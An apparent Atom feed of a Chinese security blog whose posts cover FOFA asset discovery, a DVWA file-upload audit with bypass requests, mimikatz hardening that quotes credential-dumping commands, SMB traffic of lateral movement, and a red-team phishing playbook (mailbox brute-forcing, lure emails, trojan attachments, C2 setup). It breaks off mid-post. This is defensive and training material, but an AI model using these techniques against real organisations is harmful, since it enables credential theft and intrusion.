<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sherlocz.github.io/"/>
  <updated>2021-06-21T02:05:19.644Z</updated>
  <id>http://sherlocz.github.io/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fofa通过证书收集资产</title>
    <link href="http://sherlocz.github.io/2021/06/09/fofa%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E6%94%B6%E9%9B%86%E8%B5%84%E4%BA%A7/"/>
    <id>http://sherlocz.github.io/2021/06/09/fofa通过证书收集资产/</id>
    <published>2021-06-09T01:05:28.000Z</published>
    <updated>2021-06-21T02:05:19.644Z</updated>
    
    <content type="html"><![CDATA[<p>感觉自己每次信息收集都很有问题，积累一下看下次是否能够应用到实际当中</p><h1 id="获取网站证书序列号"><a href="#获取网站证书序列号" class="headerlink" title="获取网站证书序列号"></a>获取网站证书序列号</h1><p><img src="/2021/06/09/fofa通过证书收集资产/序列号.png" alt></p><h1 id="将序列号转换成十进制"><a href="#将序列号转换成十进制" class="headerlink" title="将序列号转换成十进制"></a>将序列号转换成十进制</h1><p><img src="/2021/06/09/fofa通过证书收集资产/10.png" alt></p><h1 id="一把梭"><a href="#一把梭" class="headerlink" title="一把梭"></a>一把梭</h1><p>转换成10进制之后放在fofa里面搜索就行了<br><img src="/2021/06/09/fofa通过证书收集资产/fofa.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;感觉自己每次信息收集都很有问题，积累一下看下次是否能够应用到实际当中&lt;/p&gt;
&lt;h1 id=&quot;获取网站证书序列号&quot;&gt;&lt;a href=&quot;#获取网站证书序列号&quot; class=&quot;headerlink&quot; title=&quot;获取网站证书序列号&quot;&gt;&lt;/a&gt;获取网站证书序列号&lt;/h1&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
      <category term="信息收集" scheme="http://sherlocz.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>dvwa文件上传审计</title>
    <link href="http://sherlocz.github.io/2021/02/10/dvwa-file-upload/"/>
    <id>http://sherlocz.github.io/2021/02/10/dvwa-file-upload/</id>
    <published>2021-02-10T08:23:04.000Z</published>
    <updated>2021-02-19T06:59:27.906Z</updated>
    
    <content type="html"><![CDATA[<p>dvwa下载地址：<a href="https://dvwa.co.uk/" title="https://dvwa.co.uk/" target="_blank" rel="noopener">click</a></p><h1 id="Low-Level"><a href="#Low-Level" class="headerlink" title="Low Level"></a>Low Level</h1><p>源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>我们需要一个Upload参数(任意值)和一个文件上传的格式，数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /DVWA/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://test.com/DVWA/security.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8</span><br><span class="line">Cookie: security=low; PHPSESSID=7di0vblgbbtq8ghh5gchrqltj4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1874220292</span><br><span class="line">Content-Length: 191</span><br><span class="line"></span><br><span class="line">----------1874220292</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">----------1874220292</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;;filename=&quot;1.jsp&quot;</span><br><span class="line"></span><br><span class="line">q</span><br><span class="line">----------1874220292--</span><br></pre></td></tr></table></figure></p><p>这样就行<br><img src="/2021/02/10/dvwa-file-upload/low.jpg" alt></p><h1 id="Medium-Level"><a href="#Medium-Level" class="headerlink" title="Medium Level"></a>Medium Level</h1><p>源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这里可以一眼看出，我们在 low 的条件下，加上content-type为image/jpeg就行了，构造数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /DVWA/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://test.com/DVWA/security.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8</span><br><span class="line">Cookie: security=medium; PHPSESSID=7di0vblgbbtq8ghh5gchrqltj4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1258090497</span><br><span class="line">Content-Length: 222</span><br><span class="line"></span><br><span class="line">----------1258090497</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">----------1258090497</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;;filename=&quot;123123.jsp&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">q</span><br><span class="line">----------1258090497--</span><br></pre></td></tr></table></figure></p><p><img src="/2021/02/10/dvwa-file-upload/medium.jpg" alt></p><h1 id="High-Level"><a href="#High-Level" class="headerlink" title="High Level"></a>High Level</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">$uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里直接限定了后缀名，使用00截断进行绕过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;dvwa下载地址：&lt;a href=&quot;https://dvwa.co.uk/&quot; title=&quot;https://dvwa.co.uk/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;click&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Low-Level&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://sherlocz.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>mimikatz防御方式</title>
    <link href="http://sherlocz.github.io/2021/01/06/how-to-prevent-mimikatz-attack/"/>
    <id>http://sherlocz.github.io/2021/01/06/how-to-prevent-mimikatz-attack/</id>
    <published>2021-01-06T08:02:31.000Z</published>
    <updated>2021-01-07T06:53:26.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="限制使用Debug权限"><a href="#限制使用Debug权限" class="headerlink" title="限制使用Debug权限"></a>限制使用Debug权限</h1><p>当我们限制了Debug之后，就没有权限与lsass.exe进程进行交互读取其中存储的明文密码和hash。</p><p>正常情况下，使用mimikatz进行提权：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MIMIKATZ # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br></pre></td></tr></table></figure></p><p>配置如下：<br>本地安全策略–&gt;本地策略–&gt;用户权限分配–&gt;调试程序<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/debug_setting.png" alt></p><p>域内可以将不需要执行debug的权限删除掉，这里我将本地administrator用户权限删除，并重新启动计算机。</p><p>利用mimikatz执行提权，权限提升失败<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/mimikatz.png" alt></p><p>使用procdump离线读取，失败<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/procdump.png" alt></p><p>lsass进程转储文件，提示无权限<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/lsass.png" alt></p><h1 id="限制使用WDigest协议"><a href="#限制使用WDigest协议" class="headerlink" title="限制使用WDigest协议"></a>限制使用WDigest协议</h1><p>mimikatz可以通过wdigest协议读取存储在lsass进程中的明文密码：<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/wdigest.png" alt></p><p>Windows 8.1/Windows 10/Windows Server 2012 R2和Windows Server 2016已经默认禁用此协议，但是早期的操作系统如Windows 7和Windows Server 2008等需要安装补丁 <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a>，安装完补丁后需确认 WDigest已经在注册表中被禁用，注册表项的位置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</span><br></pre></td></tr></table></figure></p><p>将Negotiate和UseLogonCredential的值都设置成0，若没有需要创建，重启计算机之后再次尝试读取密码，发现无法抓取到hash。</p><p>批处理命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/wdigest-null.png" alt></p><h1 id="LSASS进程保护"><a href="#LSASS进程保护" class="headerlink" title="LSASS进程保护"></a>LSASS进程保护</h1><p>windows server 2012 / Windows 8.1及以后的版本操作系统已经升级了额外的LSA防护措施，来阻止不信任的进程读取LSASS进程内存或注入代码。</p><p>首先，攻击者可通过一下mimikatz命令抓取主机密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/logonpasswords.png" alt></p><p>为了避免密码被抓取，我们可以启用LSA进程守护，具体操作如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA</span><br></pre></td></tr></table></figure></p><p>将runasppl值设置为1，重启计算机</p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/runasppl.png" alt></p><h1 id="清除凭据缓存"><a href="#清除凭据缓存" class="headerlink" title="清除凭据缓存"></a>清除凭据缓存</h1><p>默认情况下，用户登录系统需要使用最近几次的凭证缓存进行身份验证，存放路径如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SECURITY\Cache</span><br></pre></td></tr></table></figure></p><p>我们可以使用mimikatz抓取缓存凭证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::cache</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/cache.png" alt></p><p>会列出最近几次缓存用户的mscache hash，这样我们可以使用mimikatz更改该hash或者爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#更改密码为123456</span><br><span class="line">lsadump::cache /user:jack ntlm:32ed87bdb5fdc5e9cba88547376818d4</span><br></pre></td></tr></table></figure><p>修改他后，在域控制器不可用时，我们可以哟弄jack/123456进行登陆，估计实战意义不大。</p><p>默认情况下，windows会保存进10次认证的密码，配置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地安全策略--&gt;本地策略--&gt;安全选项--&gt;交互式登陆:之前登陆到缓存的次数(域控制器不可用时)</span><br></pre></td></tr></table></figure></p><p>我们将缓存此时修改成0，可以避免缓存被抓取<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/cache0.png" alt></p><h1 id="Protected-Users-安全组"><a href="#Protected-Users-安全组" class="headerlink" title="Protected Users 安全组"></a>Protected Users 安全组</h1><p>限制该组用户只能使用kerberos进行认证，可防止hash和明文被抓取。</p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/protect.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;限制使用Debug权限&quot;&gt;&lt;a href=&quot;#限制使用Debug权限&quot; class=&quot;headerlink&quot; title=&quot;限制使用Debug权限&quot;&gt;&lt;/a&gt;限制使用Debug权限&lt;/h1&gt;&lt;p&gt;当我们限制了Debug之后，就没有权限与lsass.exe进程进行交
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Mimikatz" scheme="http://sherlocz.github.io/tags/Mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>Smb协议基础</title>
    <link href="http://sherlocz.github.io/2021/01/05/Smb-Intro/"/>
    <id>http://sherlocz.github.io/2021/01/05/Smb-Intro/</id>
    <published>2021-01-05T07:24:53.000Z</published>
    <updated>2021-01-06T03:22:10.246Z</updated>
    
    <content type="html"><![CDATA[<p>dir \192.168.75.131\c$<br>pth过去后dir的流量pcap包如下：<br><img src="/2021/01/05/Smb-Intro/pthpacp.png" alt></p><p>复制mimikatz流量包如下：<br>xcopy mimikatz.exe \192.168.75.131\c$\temp\mimikatz.exe<br><img src="/2021/01/05/Smb-Intro/copy.png" alt><br>1、128告诉131要创建temp\mimikatz.exe文件<br>2、使用Getinfo检索正在写入的文件系统的一些信息<br>3、Setinfo发送一些长度信息<br>4、通过write标记写入文件<br>5、关闭，传输完成</p><p>下载mimikatz<br>copy \192.168.\c$\temp\mimikatz.exe c:\temp\mimikatz.exe<br><img src="/2021/01/05/Smb-Intro/download.png" alt><br>1、请求开始<br>2、Getinfo从文件中获取数据<br>3、读取请求</p><p>远程调用<br>net user /domain<br><img src="/2021/01/05/Smb-Intro/netuser.png" alt><br>1、协商<br>2、连接到dc的ipc共享<br>3、创建请求文件<br>4、调用RPC绑定<br>5、枚举用户</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bbs.pediy.com/thread-223721.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223721.htm</a><br><a href="https://github.com/401trg/detections/tree/master/pdfs" target="_blank" rel="noopener">https://github.com/401trg/detections/tree/master/pdfs</a><br><a href="https://gallery.technet.microsoft.com/ATA-Playbook-ef0a8e38" target="_blank" rel="noopener">https://gallery.technet.microsoft.com/ATA-Playbook-ef0a8e38</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;dir \192.168.75.131\c$&lt;br&gt;pth过去后dir的流量pcap包如下：&lt;br&gt;&lt;img src=&quot;/2021/01/05/Smb-Intro/pthpacp.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;复制mimikatz流量包如下：&lt;br&gt;xcopy mimi
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="协议" scheme="http://sherlocz.github.io/tags/%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>攻防演练中的钓鱼攻击</title>
    <link href="http://sherlocz.github.io/2021/01/05/A-D-Phishing/"/>
    <id>http://sherlocz.github.io/2021/01/05/A-D-Phishing/</id>
    <published>2021-01-05T02:15:17.000Z</published>
    <updated>2021-01-05T06:17:34.041Z</updated>
    
    <content type="html"><![CDATA[<p>随着攻防演练的进行，外网能够直接进入内网必定会越来越困难，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。</p><p>钓鱼的手法有很多种，其中我们会遇到各种各样的问题，要去不断的进行尝试，反思。</p><h1 id="红队钓鱼攻击流程"><a href="#红队钓鱼攻击流程" class="headerlink" title="红队钓鱼攻击流程"></a>红队钓鱼攻击流程</h1><p><img src="/2021/01/05/A-D-Phishing/钓鱼.png" alt></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>前期的准备是为了让我们有充足的时间去思考会发生的各种问题，而在我们没有收集到足够信息之前，建议不要盲目进行钓鱼。</p><h3 id="突破口选择"><a href="#突破口选择" class="headerlink" title="突破口选择"></a>突破口选择</h3><p>钓鱼需要一个下手的地方，对于我们的目标，通常会有多个钓鱼的口子供我们选择，如：</p><ul><li>QQ/微信(群)钓鱼</li><li>客服钓鱼</li><li>邮件钓鱼</li><li>电话钓鱼</li><li>……</li></ul><p>想到了可以突破的点，我们就需要去搜寻相关信息。</p><h4 id="QQ-微信群收集"><a href="#QQ-微信群收集" class="headerlink" title="QQ/微信群收集"></a>QQ/微信群收集</h4><p>很多公司都会开放对外的客服群、售后群、活动群甚至内部员工群、公司群，通过QQ或者其他的搜索方式多多少少都能搜索到群聊，伪装成员工或者客服进群聊。<br><img src="/2021/01/05/A-D-Phishing/QQ群.png" alt></p><p>如何伪装进入群聊：<br>1、修改个人信息为员工/客户信息(包括姓名、签名、头像等等)<br>2、提前半个月或者一个月进入群聊(攻防演练阶段进去的可能性不大)</p><h4 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h4><p>邮箱的收集会很重要，所以尽量收集全面一点，最好能够弄到邮箱的账号密码，对后期钓鱼很有用，整体思路如下：<br><img src="/2021/01/05/A-D-Phishing/邮箱收集.png" alt></p><p>邮箱收集网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bit4woo/teemo</span><br><span class="line">https://github.com/laramies/theHarvester</span><br><span class="line">https://www.email-format.com/i/search/</span><br></pre></td></tr></table></figure></p><p>邮箱验证网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mailtester.com/testmail.php</span><br><span class="line">https://github.com/Tzeross/verifyemail</span><br></pre></td></tr></table></figure></p><p>邮箱爆破工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shack2/SNETCracker</span><br><span class="line">https://github.com/sensepost/ruler</span><br><span class="line">brupsuite</span><br></pre></td></tr></table></figure></p><p>推荐使用pop/smtp协议爆破，web端爆破可能会产生告警</p><h3 id="其他信息调研"><a href="#其他信息调研" class="headerlink" title="其他信息调研"></a>其他信息调研</h3><p>除了上述我们收集的目标信息，我们还需要尽可能的调研到以下几点：</p><ul><li><p>组织架构<br>部门领导信息、信息技术部成员信息、运维人员信息、新入职员工信息…</p></li><li><p>安全设备部署情况<br>TSM、HIDS、天眼、 EDR、赛门铁克、360、卡巴斯基…</p></li><li><p>……</p></li></ul><h2 id="钓鱼准备"><a href="#钓鱼准备" class="headerlink" title="钓鱼准备"></a>钓鱼准备</h2><h3 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h3><p>搭建邮服是为了方便我们发送钓鱼邮件，最好准备两台邮件服务器，一主一备。<br><img src="/2021/01/05/A-D-Phishing/ewomail.png" alt></p><ul><li><p>邮服搭建：<br><a href="https://www.iredmail.com/" target="_blank" rel="noopener">https://www.iredmail.com/</a><br><a href="http://www.ewomail.com/" target="_blank" rel="noopener">http://www.ewomail.com/</a></p></li><li><p>服务器选择：<br>阿里云、华为云等大型服务厂商会禁止搭建邮服，可以选择小型服务器提供商</p></li><li><p>伪装域名：<br>com/cn/co这样的后缀可以，top/me/xyz后缀容易被识破</p></li><li><p>SSL证书：<br>防止被归类为垃圾邮件</p></li></ul><h3 id="邮件正文编写"><a href="#邮件正文编写" class="headerlink" title="邮件正文编写"></a>邮件正文编写</h3><ul><li><p>标题<br>可以在标题上加上【紧急通知】字眼，催促对方查看邮件</p></li><li><p>正文主题<br>HW终端加固方案<br>内部软件更新包<br>客服态度恶劣举报<br>参赛作品投递</p></li><li><p>签名<br>很多公司都会有各自的签名，我们前期搞到一个邮箱的账号密码，就知道签名是什么样子了。</p></li><li><p>附件<br>木马附件添加压缩密码，压缩码直接写在正文中或者用图片格式插入。</p></li></ul><h3 id="CS服务器配置"><a href="#CS服务器配置" class="headerlink" title="CS服务器配置"></a>CS服务器配置</h3><ul><li>修改随机端口+密码</li><li>修改SSL证书</li><li>配置Malleable-C2-Profiles（隐藏隧道、伪装流量）</li><li>配置Server酱上线通知</li><li>使用便捷cna插件(on beacon_initial 